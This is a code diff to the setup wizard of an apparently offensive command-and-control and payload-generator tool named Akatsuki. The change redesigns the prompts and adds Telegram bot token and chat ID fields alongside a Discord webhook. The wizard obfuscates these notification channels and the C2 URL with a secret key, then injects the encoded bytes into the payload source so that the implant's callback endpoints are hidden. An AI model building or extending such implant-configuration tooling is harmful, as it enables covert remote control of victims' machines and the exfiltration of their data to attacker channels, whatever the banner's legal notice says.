@@ -42,21 +42,34 @@ R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"
 M = "\033[95m"; W = "\033[97m"; D = "\033[90m"; BOLD = "\033[1m"
 RST = "\033[0m"
 
+def clear_screen():
+    os.system("cls" if os.name == "nt" else "clear")
+
 def banner():
-    print(f"""
-{R}{BOLD}═══════════════════════════════════════════════════{RST}
-{R}       赤  {W}AKATSUKI C2 — SETUP WIZARD{R}  赤{RST}
-{R}{BOLD}═══════════════════════════════════════════════════{RST}
+    clear_screen()
+    print(f"""{C}{BOLD}
+ █████╗ ██╗  ██╗ █████╗ ████████╗███████╗██╗   ██╗██╗  ██╗██╗
+██╔══██╗██║ ██╔╝██╔══██╗╚══██╔══╝██╔════╝██║   ██║██║ ██╔╝██║
+███████║█████╔╝ ███████║   ██║   ███████╗██║   ██║█████╔╝ ██║
+██╔══██║██╔═██╗ ██╔══██║   ██║   ╚════██║██║   ██║██╔═██╗ ██║
+██║  ██║██║  ██╗██║  ██║   ██║   ███████║╚██████╔╝██║  ██╗██║
+╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝{RST}
+
+{Y}Akatsuki v2.0  |  Advanced C2 & Payload Generator{RST}
+{D}❖  Authorized access only{RST}
+
+{D}❖  {W}LEGAL NOTICE{RST}
+{D}Only use on systems you own or have written permission to test.{RST}
 """)
 
 def h(label):
     """Section header"""
-    print(f"\n{R}══════ {W}{BOLD}{label}{RST} {R}══════{RST}")
+    print(f"\n{W}{BOLD}── {label} ──{RST}")
 
-def ok(msg):   print(f"  {G}[✓]{RST} {msg}")
-def info(msg): print(f"  {C}[*]{RST} {msg}")
-def warn(msg): print(f"  {Y}[!]{RST} {msg}")
-def err(msg):  print(f"  {R}[✗]{RST} {msg}")
+def ok(msg):   print(f"{G}[✓]{RST} {msg}")
+def info(msg): print(f"{C}[*]{RST} {msg}")
+def warn(msg): print(f"{Y}[!]{RST} {msg}")
+def err(msg):  print(f"{R}[✗]{RST} {msg}")
 
 class GoBack(Exception):
     """Raised when user types --re to go back."""
@@ -69,10 +82,11 @@ def _check_re(val):
 
 def ask(prompt, default="", required=True):
     """Prompt with optional default value. Type --re to go back."""
-    dflt = f" {D}(default: {default}){RST}" if default else ""
-    hint = f" {D}(optional){RST}" if not required else ""
+    dflt_text = f" [{default}]" if default else ""
+    hint = f" (optional)" if not required else ""
+    padded_prompt = f"{prompt:<22}"
     while True:
-        val = input(f"  {Y}>{RST} {prompt}{dflt}{hint}: ").strip()
+        val = input(f"{padded_prompt}: ").strip()
         if val.lower() == "--re":
             raise GoBack()
         if not val and default:
@@ -81,12 +95,13 @@ def ask(prompt, default="", required=True):
             return ""
         if val:
             return val
-        print(f"  {R}  This field is required.{RST}")
+        print(f"{Y}[!] This field is required.{RST}")
 
 def ask_yn(prompt, default=True):
     """Yes/No prompt. Type --re to go back."""
-    dflt = "Y/n" if default else "y/N"
-    val = input(f"  {Y}>{RST} {prompt} [{dflt}]: ").strip().lower()
+    dflt = "yes/no" if default else "yes/no"
+    dflt_val = "yes" if default else "no"
+    val = input(f"{prompt} ({dflt}) [{dflt_val}]: ").strip().lower()
     if val == "--re":
         raise GoBack()
     if not val:
@@ -95,11 +110,12 @@ def ask_yn(prompt, default=True):
 
 def ask_choice(prompt, choices, default=None):
     """Multiple choice prompt. Type --re to go back."""
+    print(f"{prompt}:")
     for i, (key, desc) in enumerate(choices, 1):
         marker = f" {G}(default){RST}" if key == default else ""
-        print(f"    {C}[{i}]{RST} {desc}{marker}")
+        print(f"  {C}[{i}]{RST} {desc}{marker}")
     while True:
-        val = input(f"  {Y}>{RST} {prompt}: ").strip()
+        val = input(f"{'Choice':<22}: ").strip()
         if val.lower() == "--re":
             raise GoBack()
         if not val and default:
@@ -109,7 +125,7 @@ def ask_choice(prompt, choices, default=None):
         for key, _ in choices:
             if val.lower() == key.lower():
                 return key
-        print(f"  {R}  Invalid choice. Enter 1-{len(choices)} or a key name.{RST}")
+        print(f"{Y}[!] Invalid choice. Enter 1-{len(choices)} or a key name.{RST}")
 
 # ─── Obfuscator Integration ──────────────────────────────────
 sys.path.insert(0, ROOT)
@@ -196,10 +212,43 @@ def gather_input(existing=None):
         cfg["c2_url"] = ask("C2 Server URL",
                             default=cfg.get("c2_url", ""))
 
-    def step_webhook():
-        h("DISCORD WEBHOOK")
-        cfg["webhook"] = ask("Discord Webhook URL",
-                             default=cfg.get("webhook", ""))
+    def step_notifications():
+        h("NOTIFICATIONS (TELEGRAM / DISCORD)")
+        print(f"  {D}Leave blank if you don't want to use a specific notification method.{RST}")
+        cfg["tg_token"] = ask("Telegram Bot Token", default=cfg.get("tg_token", ""), required=False)
+        
+        if cfg["tg_token"]:
+            print(f"  {D}Tip: Type 'auto' to fetch automatically (you MUST send /start to your bot first){RST}")
+            chat_id = ask("Telegram Chat ID", default=cfg.get("tg_chat", ""), required=False)
+            
+            if chat_id.lower() == 'auto':
+                info("Waiting for you to send /start to your bot...")
+                import time, urllib.request, json
+                fetched = False
+                for _ in range(15): # Poll for 30 seconds (15 * 2)
+                    try:
+                        req = urllib.request.Request(f"https://api.telegram.org/bot{cfg['tg_token']}/getUpdates")
+                        with urllib.request.urlopen(req, timeout=5) as response:
+                            data = json.loads(response.read().decode('utf-8'))
+                            updates = data.get('result', [])
+                            for u in reversed(updates): # Get latest first
+                                if 'message' in u:
+                                    chat_id = str(u['message']['chat']['id'])
+                                    ok(f"Auto-fetched Chat ID: {chat_id}")
+                                    fetched = True
+                                    break
+                    except Exception: pass
+                    if fetched: break
+                    time.sleep(2)
+                
+                if not fetched:
+                    warn("Could not find Chat ID. Make sure you sent /start!")
+                    chat_id = ask("Please enter Chat ID manually", default="", required=False)
+            cfg["tg_chat"] = chat_id
+        else:
+            cfg["tg_chat"] = ""
+
+        cfg["webhook"]  = ask("Discord Webhook URL (Fallback)", default=cfg.get("webhook", ""), required=False)
 
     def step_encryption():
         h("ENCRYPTION")
@@ -238,9 +287,9 @@ def gather_input(existing=None):
         cfg["heartbeat"] = int(ask("Heartbeat interval (seconds)",
                                   default=str(cfg.get("heartbeat", 5))))
 
-    steps = [step_platform, step_c2, step_webhook, step_encryption, step_port, step_mode, step_opsec]
+    steps = [step_platform, step_c2, step_notifications, step_encryption, step_port, step_mode, step_opsec]
     
-    print(f"\n  {D}Tip: type {M}--re{D} at any prompt to go back to previous step{RST}")
+    print(f"\n{D}Tip: type {M}--re{D} at any prompt to go back to previous step{RST}")
     
     i = 0
     while i < len(steps):
@@ -262,7 +311,9 @@ def review(cfg):
     items = [
         ("Platform",     cfg["platform"].upper()),
         ("C2 URL",       cfg["c2_url"]),
-        ("Webhook",      cfg["webhook"][:50] + "..." if len(cfg.get("webhook","")) > 50 else cfg.get("webhook","")),
+        ("TG Token",     cfg.get("tg_token", "")[:20] + "..." if len(cfg.get("tg_token", "")) > 20 else cfg.get("tg_token", "")),
+        ("TG Chat",      cfg.get("tg_chat", "")),
+        ("Discord WH",   cfg["webhook"][:50] + "..." if len(cfg.get("webhook","")) > 50 else cfg.get("webhook","")),
         ("Secret Key",   cfg["secret_key"]),
         ("Rounds",       str(cfg["rounds"])),
         ("C2 Port",      str(cfg["c2_port"])),
@@ -276,7 +327,8 @@ def review(cfg):
             ("Heartbeat",    f"{cfg['heartbeat']}s"),
         ])
     for label, val in items:
-        print(f"  {D}{label:14s}{RST} {W}{val}{RST}")
+        if val:
+            print(f"{label:<22}: {C}{val}{RST}")
     print()
 
 # ─── Step 3: Obfuscate & Inject ──────────────────────────────
@@ -300,8 +352,13 @@ def configure(cfg):
         return False
     ok(f"Obfuscated Webhook → {len(wh_enc)} bytes (verified ✓)")
 
+    tg_token_enc, _ = obf_string(cfg.get("tg_token", ""), secret, rounds)
+    tg_chat_enc, _ = obf_string(cfg.get("tg_chat", ""), secret, rounds)
+
     c2_py_bytes = bytes_to_python(c2_enc)
     wh_py_bytes = bytes_to_python(wh_enc)
+    tg_token_py_bytes = bytes_to_python(tg_token_enc)
+    tg_chat_py_bytes = bytes_to_python(tg_chat_enc)
     c2_cpp_bytes = bytes_to_cpp(c2_enc)
 
     # For C++ we also need the host part (without https://)
@@ -342,6 +399,8 @@ def configure(cfg):
     if platform in ("py", "all"):
         count = inject_all_lines(C2_PY, [
             (r'_WH_ENC\s*=\s*bytes\(\[.*?\]\)', f'_WH_ENC = {wh_py_bytes}'),
+            (r'_TG_TOKEN_ENC\s*=\s*bytes\(\[.*?\]\)', f'_TG_TOKEN_ENC = {tg_token_py_bytes}'),
+            (r'_TG_CHAT_ENC\s*=\s*bytes\(\[.*?\]\)', f'_TG_CHAT_ENC = {tg_chat_py_bytes}'),
             (r'(def _xd\(d,\s*s=")[^"]*(")', rf'\g<1>{secret}\g<2>'),
             (r'(port=)\d+', rf'\g<1>{cfg["c2_port"]}'),
         ])
@@ -643,6 +702,8 @@ def reset_to_defaults():
     # Reset c2.py
     count = inject_all_lines(C2_PY, [
         (r'_WH_ENC\s*=\s*bytes\(\[.*?\]\)', f'_WH_ENC = {default_bytes_py} # PASTE_YOUR_BYTES_HERE'),
+        (r'_TG_TOKEN_ENC\s*=\s*bytes\(\[.*?\]\)', f'_TG_TOKEN_ENC = {default_bytes_py} # PASTE_YOUR_BYTES_HERE'),
+        (r'_TG_CHAT_ENC\s*=\s*bytes\(\[.*?\]\)', f'_TG_CHAT_ENC = {default_bytes_py} # PASTE_YOUR_BYTES_HERE'),
         (r'(def _xd\(d,\s*s=")[^"]*(")' , rf'\g<1>{default_key}\g<2>'),
         (r'(port=)\d+', rf'\g<1>{default_port}'),
     ])
@@ -722,7 +783,7 @@ def main():
     # Step 2: Review loop
     while True:
         review(cfg)
-        choice = input(f"  {Y}>{RST} Confirm? [{G}Y{RST}/{R}n{RST}/{M}--re to edit{RST}]: ").strip().lower()
+        choice = input(f"Confirm configuration? (yes/no/--re) [yes]: ").strip().lower()
         if choice in ("", "y", "yes"):
             break
         elif choice == "--re":
